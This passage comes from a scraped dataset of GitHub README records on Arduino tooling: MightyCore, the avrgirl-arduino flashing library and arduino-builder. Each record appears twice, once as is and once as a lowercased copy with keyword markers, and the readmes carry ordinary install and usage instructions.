is much faster than eeprom, and can handle at least 10 000 write cycles before wear becomes an issue. for more information on how it works and how you can use this in you own application, check out the serial_read_write for a simple proof-of-concept demo, and flash_put_get + flash_iterate for useful examples on how you can store strings, structs and variables to flash and retrieve then afterwards. the read_write_without_buffer example demonstrate how you can read and write to the flash memory on a lower level without using a ram buffer.\nprogmem with flash sizes greater than 64kib\nthe usual progmem attribute stores constant data such as string arrays to flash and is great if you want to preserve the precious ram. however, progmem will only store content in the lower section, from 0 and up to 64kib. if you want to store data in the upper section, you can use progmem1 (64 - 128kib) if your target is an atmega1284/p. accessing this data is not as straight forward as with progmem, but it's still doable:\nconst char far_away[] progmem1 = \"hello from far away!\\n\"; // (64 - 128kib)\nvoid print_progmem()\n{\nchar c;\n// print out far_away\nfor(uint8_t i = 0; i < sizeof(far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_away) + i);\nserial.write(c);\n}\n}\npinout\nthis core has three different pinout options:\nstandard: the default pinout, and is based on the original avr pinout.\nbobuino: basically an arduino uno pinout setting. this pinout version is great for using with shields or code that's written for the arduino uno, as the pin functions stay the same (mosi on d11, miso on d12, sck on d13).\nsanguino: this pinout is common on older 3d printer controllers such as the sanguino, reprap sanguinololu, and reprap gen7. this pinout is also known as \"avr_developers\".\nplease have a look at the (pins_arduino.h) files for detailed info. pick your favorite!\nclick to enlarge:\nmightycore standard pinout mightycore bobuino pinout mightycore sanguino pinout\nprogrammers\nmightycore adds its own copies of all the standard programmers to the \"programmer\" menu. you must select the mightycore copy of the programmer you are using for \"upload using programmer\" to work with atmega1284, atmega324a, atmega324pb, or atmega164a.\nhow to install\nboards manager installation\nthis installation method requires arduino ide version 1.6.4 or greater.\nopen the arduino ide.\nopen the file > preferences menu item.\nenter the following url in additional boards manager urls:\nhttps://mcudude.github.io/mightycore/package_mcudude_mightycore_index.json\nseparate the urls using a comma ( , ) if you have more than one url\nopen the tools > board > boards manager... menu item.\nwait for the platform indexes to finish downloading.\nscroll down until you see the mightycore entry and click on it.\nclick install.\nafter installation is complete close the boards manager window.\nmanual installation\nclick on the \"download zip\" button. extract the zip file, and move the extracted folder to the location \"~/documents/arduino/hardware\". create the \"hardware\" folder if it doesn't exist. open arduino ide, and a new category in the boards menu called \"mightycore\" will show up.\natmega324pb\nif you plan to use the atmega324pb you need the latest version of the arduino toolchain. this toolchain is available through ide 1.8.6 or newer. here's how you install/enable the toolchain:\nopen the tools > board > boards manager... menu item.\nwait for the platform indexes to finish downloading.\nthe top is named arduino avr boards. click on this item.\nmake sure the latest version is installed and selected\nclose the boards manager window.\nplatformio\nplatformio is an open source ecosystem for iot development and supports mightycore.\nsee platformio.md for more information.\ngetting started with mightycore\nok, so you've downloaded and installed mightycore, but how do you get the wheels spinning? here's a quick start guide:\nhook up your microcontroller as shown in the pinout diagram.\nif you're not planning to use the bootloader (uploading code using a usb to serial adapter), the ftdi header and the 100 nf capacitor on the reset pin can be omitted.\nopen the tools > board menu item, and select a mighycore compatible microcontroller.\nif the bod option is presented, you can select at what voltage the microcontroller will shut down at. read more about bod here.\nselect your prefered pinout. personally i prefer the standard pinout because it's \"cleaner\", but the bobuino pinout is better at arduino uno pin compatibility. read more about the different pinouts here.\nselect your prefered clock frequency. 16 mhz is standard on most arduino boards.\nselect what kind of programmer you're using under the programmers menu.\nif the variants option is presented, you'll have to specify what version of the microcontroller you're using. e.g the atmega1284 and the atmega1284p have different device signatures, so selecting the wrong one will result in an error.\nhit burn bootloader. if an led is connected to pin pb0, it should flash twice every second.\nnow that the correct fuse settings is set and the bootloader burnt, you can upload your code in two ways:\ndisconnect your programmer -----> tool !!! , and connect a usb to serial adapter to the microcontroller, like shown in the minimal setup circuit. then select the correct serial port under the tools menu, and click the upload button. if you're getting some kind of timeout error, it means your rx and tx pins are swapped, or your auto reset circuity isn't working properly (the 100 nf capacitor on the reset line).\nkeep your programmer connected, and hold down the shift button while clicking upload. this will erase the bootloader and upload your code using the programmer tool.\nyour code should now be running on your microcontroller! if you experience any issues related to bootloader burning or serial uploading, please use this forum post or create an issue on github.\nwiring reference\nto extend this core's functionality a bit futher, i've added a few missing wiring functions. as many of you know arduino is based on wiring, but that doesn't mean the wiring development isn't active. these functions are used as \"regular\" arduino functions, and there's no need to include an external library.\ni hope you find this useful, because they really are!\nfunction list\nportmode()\nportread()\nportwrite()\nsleepmode()\nsleep()\nnosleep()\nenablepower()\ndisablepower()\nfor more information please view the wiring reference page!\nlibrary porting\nsome users have reported issues when trying to use some 3rd party libraries with the atmega8535, atmega16 or atmega32. a simple guide on how to port a library can be found here.\nhardware\ni've designed a development board for this particular core. i've added all the functionality i missed with the original arduino boards, and added the original avr pinout. not all supported microcontrollers have the same pin functions, and differences are highlighted. the boards measures 8.0 * 10.0 cm (3.15 * 3.94 in)\nthe development board has some additional unique features:\na voltage select jumper to run the microcontroller at 5v or 3.3v\na breadboard friendly avr with 32 io pins, including 8 analog inputs\nall pin located at the same side of the board, making it easy to hook it up to a breadboard\nmale and female io pin headers\nplenty of 5v, 3.3v and gnd points broken out, both male and female\na large ground pad on the underside of the board for connecting alligator clips, such as the ground clip of your oscilloscope\na potentiometer for using as a voltage reference (e.g adjusting the lcd contrast)\nonboard led connected to digital pin 0 (pb0)\na socketed crystal, perfect for experimenting with different clock frequencies\nan auto reset enable header if you don't want the microcontroller to be reset every time you open the serial monitor on your pc\npwm pins clearly marked and a lookup table that can be found on the under side of the board (three ~ - all microcontrollers, two ~ - 164; 324; 644; 1284, one ~ - 1284)\nio peripherals written on the underside of the board. no need to search in the datasheet anymore!\na mini usb connector instead of a large usb type-b plug\nall serial hand shake pins broken out for applications such as bit banging (cts, dtr, ri, dcd, drt, rst)\njtag header for programming and debugging (the jtag enable fuse must be sat first)\nthe development board can be bought on my tindie store. this includes a pre programmed atmega32 chip.\nclick the images for full resolution\nminimal setup\nhere is a simple schematic showing a minimal setup using an external crystal. skip the crystal and the two capacitors if you're using the internal oscillator.\nclick to enlarge:\ndip-40 package tqfp-44 smd package atmega324pb smd package", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000102, "year": null}, {"Unnamed: 0": 2149, "autor": 109, "date": null, "content": "avrgirl-arduino\nA NodeJS library for flashing compiled sketch files to Arduino microcontroller boards.\n\ud83c\udd95Alpha release of web serial support for some Arduino boards \ud83c\udd95\nWant to contribute?\nOwn a supported Arduino and want to be a test pilot for this project with two minutes of your time?\nRun npm install -g avrgirl-arduino@latest in your terminal.\nType avrgirl-arduino test-pilot, hit enter / return key and follow the prompts.\nThank you, friend \u2764\ufe0f\nWhat is this?\navrgirl-arduino is a NodeJS library written to present a convenient way to upload precompiled sketches to an Arduino. avrgirl-arduino supports a selection of Arduino boards.\nThe current supported list:\nArduino Uno\nArduino Mega\nArduino ADK\nArduino Leonardo\nArduino Micro\nArduino Nano\nArduino Duemilanove (168)\nArduino Pro Mini\nArduino Lilypad USB\nArduino Yun\nArduino Esplora\nFemtoduino IMUduino\nRedBearLab Blend Micro\nTinyduino\nSparkfun Pro Micro\nQtechknow Qduino\nPinoccio Scout\nAdafruit Feather 32u4 Basic Proto\nArduboy\nAdafruit Circuit Playground\nBQ Zum\nBQ ZUM Core 2\nBQ ZUM Core 2\nThis library is designed to ultimately be rolled into the avrgirl project (in development), however it still works perfectly well as a stand-alone package to be used outside of avrgirl if you wish.\nHow to install\nInstall NodeJS from nodejs.org\nRun npm install avrgirl-arduino in your shell of choice\nFor Windows users\nBefore using your Arduino with avrgirl-arduino on Windows XP, 7, and 8, you may need to install the Arduino drivers included with the Arduino IDE. You can follow steps 1-4 on this guide to install the Arduino IDE and activate the relevant drivers. After step 4 of the guide (drivers) you will be ready to use your Arduino with avrgirl!\nHow do I use it?\nYour first task is to source a pre-compiled .hex file of the sketch you're interested in uploading to your Arduino. It needs to be compiled for your specific Arduino. You'll find some example hex files for each board within the junk/hex folder of this repo, however if you'd like to use your own, see this guide if you're unsure of how to go about this.\nAlready have a .hex file in a Buffer object ready to go? No problem! Pass this Buffer object in instead of the file path string, and avrgirl-arduino will take care of the rest. Hooray!\nDon't forget to plug your supported Arduino of choice into an available USB port on your computer!\nWanna use this in the CLI? See this section.\nThe following example code should get you up and running with an Arduino Uno:\nvar Avrgirl = require('avrgirl-arduino');\nvar avrgirl = new Avrgirl({\nboard: 'uno'\n});\navrgirl.flash('Blink.cpp.hex', function (error) {\nif (error) {\nconsole.error(error);\n} else {\nconsole.info('done.');\n}\n});\nWhen creating new Avrgirl(), only the board property is required. The board names to use are detailed in the table below:\nProgrammer Board Option String\nArduino Uno uno\nArduino Mega mega\nArduino ADK adk\nArduino Leonardo leonardo\nArduino Micro micro\nArduino Nano nano\nArduino Nano (with new bootloader) nano (new bootloader)\nArduino Lilypad USB lilypad-usb\nArduino Duemilanove duemilanove168\nArduino Yun yun\nArduino Esplora esplora\nRedBearLab Blend Micro blend-micro\nTiny Circuits Tinyduino tinyduino\nSparkFun Pro Micro sf-pro-micro\nQtechknow Qduino qduino\nPinoccio Scout pinoccio\nFemtoduino IMUduino imuduino\nAdafruit Feather 32u4 Basic Proto feather\nArduboy arduboy\nAdafruit Circuit Playground circuit-playground-classic\nBQ ZUM bqZum\nBQ ZUM Core 2 zumcore2\nBQ ZUM Junior zumjunior\nYou can optionally specify a port to connect to the Arduino, but if you omit this property avrgirl-arduino will do a pretty good job of finding it for you. The exception to this is if you're using the Arduino Pro Mini - please specify your port in this case as avrgirl-arduino cannot auto detect it for you.\nSpecifying the port would look something like this:\nvar avrgirl = new Avrgirl({\nboard: 'uno',\nport: '/dev/cu.usbmodem1412'\n});\nYou can list available USB ports programmatically using the the list method:\nAvrgirl.list(function(err, ports) {\nconsole.log(ports);\n/*\n[ { comName: '/dev/cu.usbmodem1421',\nmanufacturer: 'Arduino (www.arduino.cc)',\nserialNumber: '55432333038351F03170',\npnpId: '',\nlocationId: '0x14200000',\nvendorId: '0x2341',\nproductId: '0x0043',\n_standardPid: '0x0043' } ]\n*/\n});\nAlternatively, you can use the CLI to list active ports:\n$ avrgirl-arduino list\n[ { comName: '/dev/cu.usbmodem1421',\nmanufacturer: 'Arduino (www.arduino.cc)',\nserialNumber: '55432333038351F03170',\npnpId: '',\nlocationId: '0x14200000',\nvendorId: '0x2341',\nproductId: '0x0043',\n_standardPid: '0x0043' } ]\nLike logs? Turn on debug mode to see simple flashing progress logs in the console:\nvar avrgirl = new Avrgirl({\nboard: 'uno',\n// turn on debug mode!\ndebug: true\n});\nA sample:\nfound uno on port /dev/cu.usbmodem14141\nconnected\nflashing, please wait...\nflash complete.\nPrefer your own custom debug behaviour? No Problem!\nYou can pass in your own debug function instead of a boolean, and avrgirl-arduino will run that instead.\nExample:\nvar myCustomDebug = function(debugLogString) {\n// do your own debug stuff in here\n}\nvar avrgirl = new Avrgirl({\nboard: 'uno',\n// turn on debug with your own function\ndebug: myCustomDebug\n});\nHave a device that requires a manual reset?\nYou can pass in a manualReset property as a boolean, in either your custom board object or in the general Avrgirl options. This will skip the reset flow when flashing the board. Please note that this is only available for use with boards that speak the AVR109 protocol (most ATMega32U4 powered boards).\nExample without custom board:\nvar avrgirl = new Avrgirl({\nboard: 'leonardo',\n// you can put it here:\nmanualReset: true\n});\nExample with custom board:\nvar board = {\nname: 'micro',\nbaud: 57600,\nsignature: new Buffer([0x43, 0x41, 0x54, 0x45, 0x52, 0x49, 0x4e]),\nproductId: ['0x0037', '0x8037', '0x0036'],\nprotocol: 'avr109',\n// or you can put it here:\nmanualReset: true\n};\nvar avrgirl = new Avrgirl({\nboard: board\n});\nWant to Disable Code Verification?\nYou can pass in a disableVerify property as a boolean, in either your custom board object or in the general Avrgirl options. This will skip the Verification after flashing the board. Please note that this is only available for use with boards that speak the AVR109 protocol (most ATMega32U4 powered boards).\nExample without custom board:\nvar avrgirl = new Avrgirl({\nboard: 'leonardo',\n// you can put it here:\ndisableVerify: true\n});\nExample with custom board:\nvar board = {\nname: 'micro',\nbaud: 57600,\nsignature: new Buffer([0x43, 0x41, 0x54, 0x45, 0x52, 0x49, 0x4e]),\nproductId: ['0x0037', '0x8037', '0x0036'],\nprotocol: 'avr109',\n// or you can put it here:\ndisableVerify: true\n};\nvar avrgirl = new Avrgirl({\nboard: board\n});\nCan I use avrgirl-arduino as a CLI tool?\nYou sure can!\nRun npm install -g avrgirl-arduino in a shell session to install globally for easy CLI use.\nThe same example above would look like the following as a CLI call in your shell:\navrgirl-arduino flash -f Blink.cpp.hex -a uno\nRequired flags:\n-f specify the location of the hex file to flash\n-a specify the spcification of the Arduino. It can be:\nthe name of the Arduino (uno, mega,leonardo, micro, nano, \"nano (new bootloader)\", pro-mini, duemilanove168, yun, esplora, blend-micro, tinyduino, sf-pro-micro, qduino, pinoccio, feather, or imuduino)\na JavaScript file describing a custom board\nWhen using a custom board, the JavaScript file must export the board specification:\nvar board = {\nname: 'micro',\nbaud: 57600,\nsignature: new Buffer([0x43, 0x41, 0x54, 0x45, 0x52, 0x49, 0x4e]),\nproductId: ['0x0037', '0x8037', '0x0036'],\nprotocol: 'avr109',\n};\nmodule.exports = board;\nOptional flags:\n-p will allow you to specify the port where your Arduino is plugged in. Remember to specify your port if using an Arduino Pro Mini.\n-v will turn on debug/verbose mode, which will print a log of things when you run the command.\nYou can also list the supported boards:\navrgirl-arduino boards\nAs well as listing all available USB devices on your computer:\navrgirl-arduino list\nThe output will be presented in JSON format, very similar to the output of the Serialport.list() method (if you've used node-serialport before).\nCustom board specification\nWhen specifying a custom board object, a number of properties must be provided:\nname: the name of the board, used in debug and error messages\nbaud: the data rate for data transmission\nsignature: a Buffer containing the device signature\nproductId: an array of valid USB product IDs for the board\nprotocol: the board communication protocol (avr109, stk500v1 and stk500v2 are currently supported)\nIf using the stk500v2 protocol, you also need to specify:\npageSize: the size of the page used to load programs\nThe other board specification properties are optional. You may look at boards.js for more details.\nSourcing a compiled Arduino hex file\nA .hex file is the compiled end result of an Arduino sketch file. I have provided some example hex files for each board within the junk/hex folder of this repo. Feel free to use these, or if you're after something specific not provided, see the directions below.\nThe most common way to compile a sketch for your Arduino of choice is to download and install the Arduino IDE. Ensure you install version 1.6.5 or greater for the following steps.\nOpen the sketch file you'd like to export, or write a new one if you need to.\nChoose the correct target Arduino board you want to compile the hex file for, from the Tools -> Board menu.\nExport your hex file by navigating to Sketch -> Export compiled binary\nYou can find the exported hex file in the same directory your sketch file is located in.\nAcknowledgements\nCredit to Jacob Rosenthal, Ryan Day, and Elijah Insua for a lot of the heavy lifting going on underneath in this library.\nContributors\nArek Sredzki\nPawel Szymczykowski\nAndrew 'AJ' Fisher\nDerek Wheelden\nByron Hulcher\nLuis Montes\nRyan Braganza\nAlvaro Sanchez\nFrancis Gulotta\nTom Calvo\nKimio Kosaka\nSandeep Mistry\nNick Hehr", "link": "https://github.com/noopkat/avrgirl-arduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "avrgirl-arduino\na nodejs library for flashing compiled sketch files to arduino microcontroller boards.\n\ud83c\udd95alpha release of web serial support for some arduino boards \ud83c\udd95\nwant to contribute?\nown a supported arduino and want to be a test pilot for this project with two minutes of your time?\nrun npm install -g avrgirl-arduino@latest in your terminal.\ntype avrgirl-arduino test-pilot, hit enter / return key and follow the prompts.\nthank you, friend \u2764\ufe0f\nwhat is this?\navrgirl-arduino is a nodejs library written to present a convenient way to upload precompiled sketches to an arduino. avrgirl-arduino supports a selection of arduino boards.\nthe current supported list:\narduino uno\narduino mega\narduino adk\narduino leonardo\narduino micro\narduino nano\narduino duemilanove (168)\narduino pro mini\narduino lilypad usb\narduino yun\narduino esplora\nfemtoduino imuduino\nredbearlab blend micro\ntinyduino\nsparkfun pro micro\nqtechknow qduino\npinoccio scout\nadafruit feather 32u4 basic proto\narduboy\nadafruit circuit playground\nbq zum\nbq zum core 2\nbq zum core 2\nthis library is designed to ultimately be rolled into the avrgirl project (in development), however it still works perfectly well as a stand-alone package to be used outside of avrgirl if you wish.\nhow to install\ninstall nodejs from nodejs.org\nrun npm install avrgirl-arduino in your shell of choice\nfor windows users\nbefore using your arduino with avrgirl-arduino on windows xp, 7, and 8, you may need to install the arduino drivers included with the arduino ide. you can follow steps 1-4 on this guide to install the arduino ide and activate the relevant drivers. after step 4 of the guide (drivers) you will be ready to use your arduino with avrgirl!\nhow do i use it?\nyour first task is to source a pre-compiled .hex file of the sketch you're interested in uploading to your arduino. it needs to be compiled for your specific arduino. you'll find some example hex files for each board within the junk/hex folder of this repo, however if you'd like to use your own, see this guide if you're unsure of how to go about this.\nalready have a .hex file in a buffer object ready to go? no problem! pass this buffer object in instead of the file path string, and avrgirl-arduino will take care of the rest. hooray!\ndon't forget to plug your supported arduino of choice into an available usb port on your computer!\nwanna use this in the cli? see this section.\nthe following example code should get you up and running with an arduino uno:\nvar avrgirl = require('avrgirl-arduino');\nvar avrgirl = new avrgirl({\nboard: 'uno'\n});\navrgirl.flash('blink.cpp.hex', function (error) {\nif (error) {\nconsole.error(error);\n} else {\nconsole.info('done.');\n}\n});\nwhen creating new avrgirl(), only the board property is required. the board names to use are detailed in the table below:\nprogrammer board option string\narduino uno uno\narduino mega mega\narduino adk adk\narduino leonardo leonardo\narduino micro micro\narduino nano nano\narduino nano (with new bootloader) nano (new bootloader)\narduino lilypad usb lilypad-usb\narduino duemilanove duemilanove168\narduino yun yun\narduino esplora esplora\nredbearlab blend micro blend-micro\ntiny circuits tinyduino tinyduino\nsparkfun pro micro sf-pro-micro\nqtechknow qduino qduino\npinoccio scout pinoccio\nfemtoduino imuduino imuduino\nadafruit feather 32u4 basic proto feather\narduboy arduboy\nadafruit circuit playground circuit-playground-classic\nbq zum bqzum\nbq zum core 2 zumcore2\nbq zum junior zumjunior\nyou can optionally specify a port to connect to the arduino, but if you omit this property avrgirl-arduino will do a pretty good job of finding it for you. the exception to this is if you're using the arduino pro mini - please specify your port in this case as avrgirl-arduino cannot auto detect it for you.\nspecifying the port would look something like this:\nvar avrgirl = new avrgirl({\nboard: 'uno',\nport: '/dev/cu.usbmodem1412'\n});\nyou can list available usb ports programmatically using the the list method:\navrgirl.list(function(err, ports) {\nconsole.log(ports);\n/*\n[ { comname: '/dev/cu.usbmodem1421',\nmanufacturer: 'arduino (www.arduino.cc)',\nserialnumber: '55432333038351f03170',\npnpid: '',\nlocationid: '0x14200000',\nvendorid: '0x2341',\nproductid: '0x0043',\n_standardpid: '0x0043' } ]\n*/\n});\nalternatively, you can use the cli to list active ports:\n$ avrgirl-arduino list\n[ { comname: '/dev/cu.usbmodem1421',\nmanufacturer: 'arduino (www.arduino.cc)',\nserialnumber: '55432333038351f03170',\npnpid: '',\nlocationid: '0x14200000',\nvendorid: '0x2341',\nproductid: '0x0043',\n_standardpid: '0x0043' } ]\nlike logs? turn on debug mode to see simple flashing progress logs in the console:\nvar avrgirl = new avrgirl({\nboard: 'uno',\n// turn on debug mode!\ndebug: true\n});\na sample:\nfound uno on port /dev/cu.usbmodem14141\nconnected\nflashing, please wait...\nflash complete.\nprefer your own custom debug behaviour? no problem!\nyou can pass in your own debug function instead of a boolean, and avrgirl-arduino will run that instead.\nexample:\nvar mycustomdebug = function(debuglogstring) {\n// do your own debug stuff in here\n}\nvar avrgirl = new avrgirl({\nboard: 'uno',\n// turn on debug with your own function\ndebug: mycustomdebug\n});\nhave a device that requires a manual reset?\nyou can pass in a manualreset property as a boolean, in either your custom board object or in the general avrgirl options. this will skip the reset flow when flashing the board. please note that this is only available for use with boards that speak the avr109 protocol (most atmega32u4 powered boards).\nexample without custom board:\nvar avrgirl = new avrgirl({\nboard: 'leonardo',\n// you can put it here:\nmanualreset: true\n});\nexample with custom board:\nvar board = {\nname: 'micro',\nbaud: 57600,\nsignature: new buffer([0x43, 0x41, 0x54, 0x45, 0x52, 0x49, 0x4e]),\nproductid: ['0x0037', '0x8037', '0x0036'],\nprotocol: 'avr109',\n// or you can put it here:\nmanualreset: true\n};\nvar avrgirl = new avrgirl({\nboard: board\n});\nwant to disable code verification?\nyou can pass in a disableverify property as a boolean, in either your custom board object or in the general avrgirl options. this will skip the verification after flashing the board. please note that this is only available for use with boards that speak the avr109 protocol (most atmega32u4 powered boards).\nexample without custom board:\nvar avrgirl = new avrgirl({\nboard: 'leonardo',\n// you can put it here:\ndisableverify: true\n});\nexample with custom board:\nvar board = {\nname: 'micro',\nbaud: 57600,\nsignature: new buffer([0x43, 0x41, 0x54, 0x45, 0x52, 0x49, 0x4e]),\nproductid: ['0x0037', '0x8037', '0x0036'],\nprotocol: 'avr109',\n// or you can put it here:\ndisableverify: true\n};\nvar avrgirl = new avrgirl({\nboard: board\n});\ncan i use avrgirl-arduino as a cli -----> tool !!! ?\nyou sure can!\nrun npm install -g avrgirl-arduino in a shell session to install globally for easy cli use.\nthe same example above would look like the following as a cli call in your shell:\navrgirl-arduino flash -f blink.cpp.hex -a uno\nrequired flags:\n-f specify the location of the hex file to flash\n-a specify the spcification of the arduino. it can be:\nthe name of the arduino (uno, mega,leonardo, micro, nano, \"nano (new bootloader)\", pro-mini, duemilanove168, yun, esplora, blend-micro, tinyduino, sf-pro-micro, qduino, pinoccio, feather, or imuduino)\na javascript file describing a custom board\nwhen using a custom board, the javascript file must export the board specification:\nvar board = {\nname: 'micro',\nbaud: 57600,\nsignature: new buffer([0x43, 0x41, 0x54, 0x45, 0x52, 0x49, 0x4e]),\nproductid: ['0x0037', '0x8037', '0x0036'],\nprotocol: 'avr109',\n};\nmodule.exports = board;\noptional flags:\n-p will allow you to specify the port where your arduino is plugged in. remember to specify your port if using an arduino pro mini.\n-v will turn on debug/verbose mode, which will print a log of things when you run the command.\nyou can also list the supported boards:\navrgirl-arduino boards\nas well as listing all available usb devices on your computer:\navrgirl-arduino list\nthe output will be presented in json format, very similar to the output of the serialport.list() method (if you've used node-serialport before).\ncustom board specification\nwhen specifying a custom board object, a number of properties must be provided:\nname: the name of the board, used in debug and error messages\nbaud: the data rate for data transmission\nsignature: a buffer containing the device signature\nproductid: an array of valid usb product ids for the board\nprotocol: the board communication protocol (avr109, stk500v1 and stk500v2 are currently supported)\nif using the stk500v2 protocol, you also need to specify:\npagesize: the size of the page used to load programs\nthe other board specification properties are optional. you may look at boards.js for more details.\nsourcing a compiled arduino hex file\na .hex file is the compiled end result of an arduino sketch file. i have provided some example hex files for each board within the junk/hex folder of this repo. feel free to use these, or if you're after something specific not provided, see the directions below.\nthe most common way to compile a sketch for your arduino of choice is to download and install the arduino ide. ensure you install version 1.6.5 or greater for the following steps.\nopen the sketch file you'd like to export, or write a new one if you need to.\nchoose the correct target arduino board you want to compile the hex file for, from the tools -> board menu.\nexport your hex file by navigating to sketch -> export compiled binary\nyou can find the exported hex file in the same directory your sketch file is located in.\nacknowledgements\ncredit to jacob rosenthal, ryan day, and elijah insua for a lot of the heavy lifting going on underneath in this library.\ncontributors\narek sredzki\npawel szymczykowski\nandrew 'aj' fisher\nderek wheelden\nbyron hulcher\nluis montes\nryan braganza\nalvaro sanchez\nfrancis gulotta\ntom calvo\nkimio kosaka\nsandeep mistry\nnick hehr", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000109, "year": null}, {"Unnamed: 0": 2153, "autor": 113, "date": null, "content": "DEPRECATION WARNING: This tool is being phased out in favor of Arduino CLI, we recommend to use Arduino CLI for new projects.\nThe source code of the builder has been moved in the arduino-cli repository (as a legacy package) where it will be maintained and developed and eventually moved outside the legacy package once properly integrated in the Arduino CLI codebase.\nThe arduino-builder is now just a wrapper of arduino-cli. We will continue to provide builds of this project for some time to allow a smooth transition period to our users.\nArduino Builder\nA command line tool for compiling Arduino sketches\nThis tool is able to parse Arduino Hardware specifications, properly run gcc and produce compiled sketches.\nAn Arduino sketch differs from a standard C program in that it misses a main (provided by the Arduino core), function prototypes are not mandatory, and libraries inclusion is automagic (you just have to #include them). This tool generates function prototypes and gathers library paths, providing gcc with all the needed -I params.\nUsage\n-compile or -dump-prefs or -preprocess: Optional. If omitted, defaults to -compile. -dump-prefs will just print all build preferences used, -compile will use those preferences to run the actual compiler, -preprocess will only print preprocessed code to stdout.\n-hardware: Mandatory. Folder containing Arduino platforms. An example is the hardware folder shipped with the Arduino IDE, or the packages folder created by Arduino Boards Manager. Can be specified multiple times. If conflicting hardware definitions are specified, the last one wins.\n-tools: Mandatory. Folder containing Arduino tools (gcc, avrdude...). An example is the hardware/tools folder shipped with the Arduino IDE, or the packages folder created by Arduino Boards Manager. Can be specified multiple times.\n-libraries: Optional. Folder containing Arduino libraries. An example is the libraries folder shipped with the Arduino IDE. Can be specified multiple times.\n-fqbn: Mandatory. Fully Qualified Board Name, e.g.: arduino:avr:uno\n-build-path: Optional. Folder where to save compiled files. If omitted, a folder will be created in the temporary folder specified by your OS.\n-prefs=key=value: Optional. It allows to override some build properties.\n-warnings: Optional, can be \"none\", \"default\", \"more\" and \"all\". Defaults to \"none\". Used to tell gcc which warning level to use (-W flag).\n-verbose: Optional, turns on verbose mode.\n-quiet: Optional, supresses almost every output.\n-debug-level: Optional, defaults to \"5\". Used for debugging. Set it to 10 when submitting an issue.\n-core-api-version: Optional, defaults to \"10600\". The version of the Arduino IDE which is using this tool.\n-logger: Optional, can be \"human\", \"humantags\" or \"machine\". Defaults to \"human\". If \"humantags\" the messages are qualified with a prefix that indicates their level (info, debug, error). If \"machine\", messages emitted will be in a format which the Arduino IDE understands and that it uses for I18N.\n-version: if specified, prints version and exits.\n-build-options-file: it specifies path to a local build.options.json file (see paragraph below), which allows you to omit specifying params such as -hardware, -tools, -libraries, -fqbn, -pref and -ide-version.\n-vid-pid: when specified, VID/PID specific build properties are used, if boards supports them.\nFinal mandatory parameter is the sketch to compile (of course).\nWhat is and how to use build.options.json file\nEvery time you run this tool, it will create a build.options.json file in build path. It's used to understand if build options (such as hardware folders, fqbn and so on) were changed when compiling the same sketch. If they changed, the whole build path is wiped out. If they didn't change, previous compiled files will be reused if the corresponding source files didn't change as well. You can save this file locally and use it instead of specifying -hardware, -tools, -libraries, -fqbn, -pref and -ide-version.\nUsing it for continuously verify your libraries or cores\nSee Doing continuous integration with arduino builder.\nBuilding from source\nYou need a version of Go >=1.13.0.\nThe project now uses go.mod for dependecy management, there is no need to go get anything or to set GOPATH env vars. The build is very simple:\n$ git clone https://github.com/arduino/arduino-builder.git\n$ cd arduino-builder\n$ go build\n[.....]\n$ ./arduino-builder -version\nArduino Builder 1.5.1\nCopyright (C) 2015 Arduino LLC and contributors\nSee https://www.arduino.cc/ and https://github.com/arduino/arduino-builder/graphs/contributors\nThis is free software; see the source for copying conditions. There is NO\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\nSecurity\nIf you think you found a vulnerability or other security-related bug in this project, please read our security policy and report the bug to our Security Team \ud83d\udee1\ufe0f Thank you!\ne-mail contact: security@arduino.cc\nLicense and Copyright\narduino-builder is licensed under General Public License version 2, as published by the Free Software Foundation. See LICENSE.txt.\nCopyright (C) 2017 Arduino AG and contributors\nSee https://www.arduino.cc/ and https://github.com/arduino/arduino-builder/graphs/contributors", "link": "https://github.com/arduino/arduino-builder", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "deprecation warning: this -----> tool !!!  is being phased out in favor of arduino cli, we recommend to use arduino cli for new projects.\nthe source code of the builder has been moved in the arduino-cli repository (as a legacy package) where it will be maintained and developed and eventually moved outside the legacy package once properly integrated in the arduino cli codebase.\nthe arduino-builder is now just a wrapper of arduino-cli. we will continue to provide builds of this project for some time to allow a smooth transition period to our users.\narduino builder\na command line tool for compiling arduino sketches\nthis tool is able to parse arduino hardware specifications, properly run gcc and produce compiled sketches.\nan arduino sketch differs from a standard c program in that it misses a main (provided by the arduino core), function prototypes are not mandatory, and libraries inclusion is automagic (you just have to #include them). this tool generates function prototypes and gathers library paths, providing gcc with all the needed -i params.\nusage\n-compile or -dump-prefs or -preprocess: optional. if omitted, defaults to -compile. -dump-prefs will just print all build preferences used, -compile will use those preferences to run the actual compiler, -preprocess will only print preprocessed code to stdout.\n-hardware: mandatory. folder containing arduino platforms. an example is the hardware folder shipped with the arduino ide, or the packages folder created by arduino boards manager. can be specified multiple times. if conflicting hardware definitions are specified, the last one wins.\n-tools: mandatory. folder containing arduino tools (gcc, avrdude...). an example is the hardware/tools folder shipped with the arduino ide, or the packages folder created by arduino boards manager. can be specified multiple times.\n-libraries: optional. folder containing arduino libraries. an example is the libraries folder shipped with the arduino ide. can be specified multiple times.\n-fqbn: mandatory. fully qualified board name, e.g.: arduino:avr:uno\n-build-path: optional. folder where to save compiled files. if omitted, a folder will be created in the temporary folder specified by your os.\n-prefs=key=value: optional. it allows to override some build properties.\n-warnings: optional, can be \"none\", \"default\", \"more\" and \"all\". defaults to \"none\". used to tell gcc which warning level to use (-w flag).\n-verbose: optional, turns on verbose mode.\n-quiet: optional, supresses almost every output.\n-debug-level: optional, defaults to \"5\". used for debugging. set it to 10 when submitting an issue.\n-core-api-version: optional, defaults to \"10600\". the version of the arduino ide which is using this tool.\n-logger: optional, can be \"human\", \"humantags\" or \"machine\". defaults to \"human\". if \"humantags\" the messages are qualified with a prefix that indicates their level (info, debug, error). if \"machine\", messages emitted will be in a format which the arduino ide understands and that it uses for i18n.\n-version: if specified, prints version and exits.\n-build-options-file: it specifies path to a local build.options.json file (see paragraph below), which allows you to omit specifying params such as -hardware, -tools, -libraries, -fqbn, -pref and -ide-version.\n-vid-pid: when specified, vid/pid specific build properties are used, if boards supports them.\nfinal mandatory parameter is the sketch to compile (of course).\nwhat is and how to use build.options.json file\nevery time you run this tool, it will 